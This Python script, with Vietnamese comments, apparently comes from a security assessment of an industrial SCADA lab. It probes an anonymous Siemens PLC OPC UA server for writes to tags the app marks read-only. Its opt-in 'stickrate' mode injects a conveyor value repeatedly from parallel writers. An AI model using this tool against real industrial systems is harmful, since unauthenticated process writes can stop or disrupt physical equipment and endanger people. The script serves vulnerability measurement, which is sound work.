#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
tests/day8/probe_opcua_write.py

Probe quyền ghi ở TẦNG OPC UA SERVER (cửa 2 — anonymous, no-security) và đối
chiếu với cờ `writable` mà APP Web-SCADA khai trong config/opcua_tags.yaml.
Mục tiêu: chứng minh định lượng "cửa 2 mở" (server nhận ghi cả những tag app
đánh dấu writable:false) và ĐO trần persistence của value-injection.

Vì sao cần: RBAC admin/controller chỉ khóa cửa APP; server OPC UA của PLC nhận
ghi trực tiếp (concealed_stop đã dùng). Script này biến quan sát đó thành bảng
bằng chứng + con số.

HAI CHẾ ĐỘ:
  --mode writability  (an toàn, mặc định)
      Với mỗi tag: đọc giá trị hiện tại rồi GHI LẠI CHÍNH GIÁ TRỊ ĐÓ (same-value,
      KHÔNG đổi trạng thái process) và đọc lại. Server nhận ghi hay từ chối?
      In bảng: app_writable vs server_accepts -> phát hiện tag "app=false nhưng
      server=TRUE" (đúng lỗ hổng).

  --mode stickrate    (opt-in — CÓ ghi giá trị mục tiêu)
      Ghi 1 giá trị (mặc định True cho bang_tai) lặp N lần, đọc lại ngay sau mỗi
      lần, đếm tỉ lệ readback == target -> ĐỊNH LƯỢNG trần "dính" (~17-18% với
      value-injection do PLC scan-cycle ghi đè). Hỗ trợ --workers để lặp lại thí
      nghiệm "tăng writer song song không cải thiện tỉ lệ".

DataValue được dựng TỐI GIẢN (chỉ Variant, không SourceTimestamp) — tránh lỗi
BadWriteNotSupported của S7-1500 (xem BAO_CAO_DAY7.md §5.3).

Chạy: xem cuối file / README lệnh.
"""
from __future__ import annotations

import argparse
import asyncio
import time
from pathlib import Path

import yaml
from asyncua import Client, ua

REPO_ROOT = Path(__file__).resolve().parents[2]
DEFAULT_CFG = REPO_ROOT / "config" / "opcua_tags.yaml"


def load_tags(cfg_path: str):
    data = yaml.safe_load(open(cfg_path, encoding="utf-8"))
    tags = data.get("tags", data) if isinstance(data, dict) else data
    out = []
    for t in tags:
        out.append({
            "key": t.get("key"),
            "node_id": t.get("node_id"),
            "data_type": t.get("data_type", ""),
            "app_writable": bool(t.get("writable", False)),
        })
    return out


def minimal_datavalue(dv: "ua.DataValue"):
    """Dựng lại DataValue chỉ gồm Variant (giá trị + kiểu), bỏ mọi timestamp."""
    return ua.DataValue(ua.Variant(dv.Value.Value, dv.Value.VariantType))


async def probe_writability(client, tags):
    print(f"\n{'key':14s} {'app_writable':13s} {'server_accepts':15s} {'verdict'}")
    print("-" * 72)
    rows = []
    for t in tags:
        node = client.get_node(t["node_id"])
        server_accepts = None
        detail = ""
        try:
            dv = await node.read_data_value()      # đọc giá trị + kiểu hiện tại
            same = minimal_datavalue(dv)            # ghi lại ĐÚNG giá trị đó
            await node.write_value(same)            # -> không đổi process
            after = await node.read_data_value()
            server_accepts = True
            detail = f"val={dv.Value.Value!r}"
        except Exception as exc:
            server_accepts = False
            detail = f"{type(exc).__name__}"
        # verdict
        if server_accepts and not t["app_writable"]:
            verdict = "⚠ VULN: app cấm, server CHO ghi"
        elif server_accepts and t["app_writable"]:
            verdict = "server cho ghi (app cũng cho)"
        elif not server_accepts:
            verdict = f"server từ chối ({detail})"
        else:
            verdict = ""
        print(f"{str(t['key']):14s} {str(t['app_writable']):13s} "
              f"{str(server_accepts):15s} {verdict}")
        rows.append({**t, "server_accepts": server_accepts, "detail": detail,
                     "vuln": bool(server_accepts and not t["app_writable"])})
    n_vuln = sum(r["vuln"] for r in rows)
    n_open = sum(bool(r["server_accepts"]) for r in rows)
    print("-" * 72)
    print(f"[TỔNG] {n_open}/{len(rows)} tag server CHO ghi; "
          f"{n_vuln} tag 'app cấm nhưng server cho' (lỗ hổng cửa-2).")
    return rows


def parse_target(s: str, variant_type):
    if variant_type == ua.VariantType.Boolean:
        return str(s).strip().lower() in ("1", "true", "on", "yes")
    try:
        return int(s)
    except ValueError:
        return float(s)


async def _stick_worker(node, target_dv, iterations, delay, counters, wid):
    for _ in range(iterations):
        try:
            await node.write_value(target_dv)
            back = await node.read_value()
            counters["writes"] += 1
            if back == counters["target_val"]:
                counters["hits"] += 1
        except Exception:
            counters["errors"] += 1
        if delay > 0:
            await asyncio.sleep(delay)


async def probe_stickrate(client, tag, target, iterations, workers, delay):
    node = client.get_node(tag["node_id"])
    dv = await node.read_data_value()
    vt = dv.Value.VariantType
    target_val = parse_target(target, vt)
    target_dv = ua.DataValue(ua.Variant(target_val, vt))
    counters = {"writes": 0, "hits": 0, "errors": 0, "target_val": target_val}

    print(f"\n[stickrate] tag={tag['key']} node={tag['node_id']}")
    print(f"  target={target_val!r} ({vt.name}) | iterations={iterations} x workers={workers} | delay={delay}s")
    print(f"  (PLC scan-cycle sẽ ghi đè — đo tỉ lệ readback==target)")
    t0 = time.time()
    await asyncio.gather(*[
        _stick_worker(node, target_dv, iterations, delay, counters, w)
        for w in range(workers)
    ])
    dt = time.time() - t0
    w, h, e = counters["writes"], counters["hits"], counters["errors"]
    rate = (h / w * 100) if w else 0.0
    print("-" * 60)
    print(f"  writes={w} hits(readback==target)={h} errors={e}")
    print(f"  >>> TỈ LỆ DÍNH (persistence) = {rate:.1f}%  ({h}/{w}) trong {dt:.1f}s")
    print(f"  eff_write_rate = {w/dt:.0f} write/s")
    return {"writes": w, "hits": h, "errors": e, "persistence_pct": round(rate, 1)}


async def main_async(args):
    tags = load_tags(args.config)
    async with Client(url=args.opc_url, timeout=10) as client:
        print(f"[+] Kết nối OPC UA (anonymous): {args.opc_url}  — {len(tags)} tag từ config")
        if args.mode == "writability":
            await probe_writability(client, tags)
        else:
            tag = next((t for t in tags if t["key"] == args.tag), None)
            if tag is None:
                raise SystemExit(f"[ERR] không thấy tag key='{args.tag}' trong config")
            await probe_stickrate(client, tag, args.target, args.iterations,
                                  args.workers, args.delay)


def main():
    p = argparse.ArgumentParser(description="Probe OPC UA server write access + persistence")
    p.add_argument("--opc-url", default="opc.tcp://192.168.210.211:4840")
    p.add_argument("--config", default=str(DEFAULT_CFG))
    p.add_argument("--mode", choices=["writability", "stickrate"], default="writability")
    p.add_argument("--tag", default="bang_tai", help="(stickrate) key tag muốn đo")
    p.add_argument("--target", default="true", help="(stickrate) giá trị mục tiêu: true/false/số")
    p.add_argument("--iterations", type=int, default=300, help="(stickrate) số lần ghi/worker")
    p.add_argument("--workers", type=int, default=5, help="(stickrate) số writer song song")
    p.add_argument("--delay", type=float, default=0.0, help="(stickrate) nghỉ giữa các lần ghi (s)")
    args = p.parse_args()
    try:
        asyncio.run(main_async(args))
    except Exception as e:
        print(f"[ERROR] {e}")
        raise SystemExit(1)


if __name__ == "__main__":
    main()
